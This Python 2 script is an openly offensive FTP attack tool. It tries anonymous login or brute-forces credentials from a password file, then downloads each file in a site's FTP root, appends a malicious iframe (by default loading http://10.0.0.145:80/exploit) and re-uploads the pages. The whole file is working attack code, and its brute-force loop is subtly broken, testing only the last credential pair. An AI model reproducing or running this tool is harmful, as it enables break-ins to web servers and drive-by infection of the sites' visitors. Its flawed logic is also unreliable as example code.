#!/usr/bin/env python2
# written by Moses Arocha
# Program attempts to brute force into an FTP server, gain access, or login in as an anonymous user, 
# then will inject malicious code into the webpage after it has downloaded

import ftplib
import optparse
import time

def Anonymous(hostname):
	try:
		ftp = ftplib.FTP(hostname)
		ftp.login('anonymous', 'me@yourdomain.com')
		print '\n\t[Success] ' + str(hostname) + ' FTP Anonymous Login Succeeded'
		ftp.quit()
		return True
	except Exception, e:
		print '\n\t[Failure] ' + str(hostname) + ' FTP Anonymous Login Failed\n'
		return False
	
def BruteForce(hostname, passwdFile):
	pF = open(passwdFile, 'r')
	for line in pF.readlines():
		time.sleep(1)
		userName = line.split(':')[0]
		passWord = line.split(':')[1].strip('\r').strip('\n')
		print ' [+] Trying : ' + userName +'/' + passWord
	try:
		ftp = ftplib.FTP(hostname)
		ftp.login(userName, passWord)
		print '\n[Success] ' + str(hostname) + ' FTP Login Succeeded: ' + userName + '/' + passWord
		ftp.quit()
		return (userName, passWord)
	except Exception, e:
		pass
	print '\n[Failure] Could Not Brute Force FTP Credentials'
	return (None, None)

def DefaultPage(ftp):
	try:
		dirList = ftp.nlst()
	except:
		dirList = []
		print '[Failure] Could Not List Directory Contents'
		print '[Continue] Skipping To Next Target'
		return
	retList = []
	for fileName in dirList:
		fn = fileName.lower()
		if '.php' in fn or '.htm' in fn or '.asp' in fn or '.html' in fn:
			print '[+] Found Home Page: ' + fileName
		retList.append(fileName)
	return retList

def Injection(ftp, page, redirect):
	f = open(page + '.tmp', 'w')
	ftp.retrlines('RETR ' + page, f.write)
	print ' [Step 1] Downloaded Page: ' + page
	f.write(redirect)
	f.close()
	print ' [Step 2] Injected Malicious IFrame on: '+ page
	ftp.storlines('STOR ' + page, open(page + '.tmp'))
	print ' [Step 3] Uploaded Injected Page: ' + page
	
def WebAttack(username, password, TargetHost, redirect):
	ftp = ftplib.FTP(TargetHost)
	ftp.login(username, password)
	defPages = DefaultPage(ftp)
	for defPage in defPages:
		Injection(ftp, defPage, redirect)

def main():
	parser = optparse.OptionParser("Usages For Program: -H <Target Host[s]> -R <Redirect Page> -F <Password File>")
	parser.add_option('-H', '--Host', dest='TargetHosts', type='string', help='specify target host')
	parser.add_option('-P', '--Password', dest='passwdFile', type='string', help='specify user/password file', default='passwordlist.txt')
	parser.add_option('-R', '--Redirect', dest='redirect', type='string', help='specify a redirection page', default='<iframe src="http://10.0.0.145:80/exploit"></iframe>')
	(options, args) = parser.parse_args()
	TargetHosts = str(options.TargetHosts).split(',')
	passwdFile = options.passwdFile
	redirect = options.redirect
	if TargetHosts == None or redirect == None:
		print parser.usage
		exit(0)
	for TargetHost in TargetHosts:
		username = None
		password = None
		if Anonymous(TargetHost) == True:
			username = 'anonymous'
			password = 'me@yourdomain.com'
			print ' [Success] Now Using Anonymous Username and Password'
			WebAttack(username, password, TargetHost, redirect)
		elif passwdFile != None:
			(username, password) = BruteForce(TargetHost, passwdFile)
		if password != None:	
			print '[+] Using Credientals: ' + username + '/' + password + ' To WebAttack'
			WebAttack(username, password, TargetHost, redirect)


if __name__ == '__main__':
	main()
